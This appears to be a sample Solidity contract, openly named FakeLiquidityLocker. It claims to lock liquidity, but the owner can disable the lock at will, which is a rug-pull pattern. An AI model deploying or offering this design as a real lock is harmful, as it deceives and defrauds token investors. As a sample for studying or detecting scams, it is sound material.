// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract FakeLiquidityLocker {
    address public owner;
    address public lpToken;
    bool public lockEnabled = true;

    modifier onlyOwner(){ require(msg.sender==owner, "not owner"); _; }

    constructor(address _lp){
        owner = msg.sender;
        lpToken = _lp;
    }

    function unlockLiquidity() external onlyOwner {
        lockEnabled = false;
    }
}
